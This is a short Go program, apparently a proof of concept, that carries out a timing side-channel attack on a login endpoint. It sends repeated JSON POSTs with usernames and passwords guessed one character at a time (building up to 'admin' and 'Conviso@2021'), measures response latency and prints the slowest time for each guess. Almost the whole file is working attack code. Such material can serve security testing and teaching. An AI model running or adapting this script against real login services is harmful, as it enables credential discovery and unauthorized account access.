package main

import (
	"bytes"
	"flag"
	"fmt"
	// "io/ioutil"
	"net/http"
	// "strconv"
	"time"
)

func httpPost(target, user, pass string) {
	var times []string
	var floatTimes []int64
	for i := 0; i < 4; i++ {
		var reqBody = []byte(fmt.Sprintf(`{"user":"%v", "pass":"%v"}`, user, pass))
		req, err := http.NewRequest("POST", target, bytes.NewBuffer(reqBody))
		req.Header.Set("Content-Type", "application/json")

		client := &http.Client{}
		start := time.Now()
		resp, err := client.Do(req)
		if err != nil {
			panic(err)
		}
		end := time.Now()
		defer resp.Body.Close()

		// fmt.Println("response Status:", resp.Status)
		// body, _ := ioutil.ReadAll(resp.Body)
		// fmt.Println("response Body:", string(body))
		times = append(times, fmt.Sprintf("%v", end.Sub(start)))
		floatTimes = append(floatTimes, end.Sub(start).Microseconds())
	}
	media := int64(0)
	for _, t := range floatTimes {
		if media < t {
			media = t
		}
		//media = media + t
	}
	// media = media / 4

	fmt.Printf("Tagert:\t%v\t\tPayload:\t%v:%v\t\t\tTime:\t%v %v\n",
		target, user, pass, media, times)
}

func main() {
	flag.Parse()
	target := flag.Arg(0)

	httpPost(target, "baa", "abcdefg")
	fmt.Println("Start")
	httpPost(target, "aaa", "abcdefg")
	httpPost(target, "adaa", "abcdefg")
	httpPost(target, "admnnn", "abcdefg")
	httpPost(target, "admiiii", "abcdefg")
	httpPost(target, "admin", "abcdefg")

	httpPost(target, "baa", "abcdefg")
	httpPost(target, "baa", "Cbcdefg")
	httpPost(target, "baa", "Cocdefg")
	httpPost(target, "baa", "Condefg")
	httpPost(target, "baa", "Convefg")
	httpPost(target, "baa", "Convifg")

	httpPost(target, "admin", "Cbcdefg")
	httpPost(target, "admin", "Cocdefg")
	httpPost(target, "admin", "Condefg")
	httpPost(target, "admin", "Convefg")
	httpPost(target, "admin", "Convifg")
	httpPost(target, "admin", "Convisg")
	httpPost(target, "admin", "Conviso")

	httpPost(target, "admin", "Conviso@2021")
}
